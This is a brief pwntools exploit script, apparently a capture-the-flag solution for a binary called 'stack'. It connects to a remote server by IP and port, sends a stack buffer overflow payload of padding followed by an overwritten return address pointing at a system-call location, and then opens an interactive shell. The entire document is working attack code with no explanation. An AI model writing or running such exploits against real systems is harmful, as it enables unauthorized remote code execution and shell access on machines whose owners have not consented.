from pwn import *

#sh = process('./stack')
sh =remote('159.65.68.241','10003')
sys_addr = 0x80491e2

pay = 'a'*0x3a +'bbbb'+p32(sys_addr)

sh.sendline(pay)

sh.interactive()
